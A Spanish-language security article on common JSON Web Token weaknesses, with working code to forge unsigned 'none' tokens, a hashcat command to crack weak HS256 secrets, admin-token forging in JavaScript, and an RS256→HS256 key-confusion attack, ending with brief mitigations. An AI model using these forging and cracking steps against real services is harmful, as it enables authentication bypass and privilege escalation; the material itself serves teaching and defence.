---
title: "JWT: Vulnerabilidades comunes y cómo explotarlas"
date: 2024-11-02
description: "Análisis de los ataques más frecuentes contra JSON Web Tokens: none algorithm, weak secrets, y header injection."
tags: ["jwt", "web", "auth", "crypto"]
category: article
draft: false
---

## ¿Qué es un JWT?

Un JSON Web Token tiene tres partes separadas por puntos:

```
header.payload.signature
```

Cada parte está codificada en Base64URL. El header indica el algoritmo, el payload contiene los claims, y la firma verifica la integridad.

## Ataque 1: Algorithm = "none"

Algunos servidores mal configurados aceptan tokens sin firma si `alg` es `none`.

```python
import base64, json

def b64url(data: dict) -> str:
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(',', ':')).encode()
    ).rstrip(b'=').decode()

header  = b64url({"alg": "none", "typ": "JWT"})
payload = b64url({"sub": "admin", "role": "admin"})

# signature vacía
token = f"{header}.{payload}."
print(token)
```

Envía el token así construido y observa si el servidor lo acepta.

## Ataque 2: Brute-force de HS256

Si el secreto es débil, herramientas como `hashcat` pueden romperlo offline:

```bash
# extraer token de la respuesta y guardarlo
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyIiwicm9sZSI6InVzZXIifQ.xxx"

hashcat -a 0 -m 16500 "$TOKEN" /usr/share/wordlists/rockyou.txt
```

Con el secreto recuperado, puedes firmar tokens arbitrarios:

```javascript
import jwt from 'jsonwebtoken';

const payload = { sub: 'admin', role: 'admin' };
const token = jwt.sign(payload, 'supersecret123', { algorithm: 'HS256' });
console.log(token);
```

## Ataque 3: Header Injection (alg confusion RS256 → HS256)

Cuando el servidor usa RS256 pero acepta HS256, puedes firmar con la clave pública como secreto HMAC.

```http
GET /api/profile HTTP/1.1
Host: target.com
Authorization: Bearer <crafted_token>
```

Primero obtén la clave pública (normalmente en `/jwks.json`):

```bash
curl https://target.com/.well-known/jwks.json | jq '.keys[0]'
```

Luego convierte la clave pública PEM a bytes y úsala como secreto HMAC. Hay herramientas que automatizan esto:

```bash
python3 jwt_tool.py <token> -X k -pk public.pem
```

## Mitigaciones

- Fijar el algoritmo esperado en el servidor, nunca confiar en el header
- Usar secretos de al menos 256 bits generados criptográficamente
- Validar `exp`, `iss`, y `aud` en cada request
- Rotar claves con regularidad y mantener un JWK Set

```bash
# generar un secreto seguro
openssl rand -hex 32
```
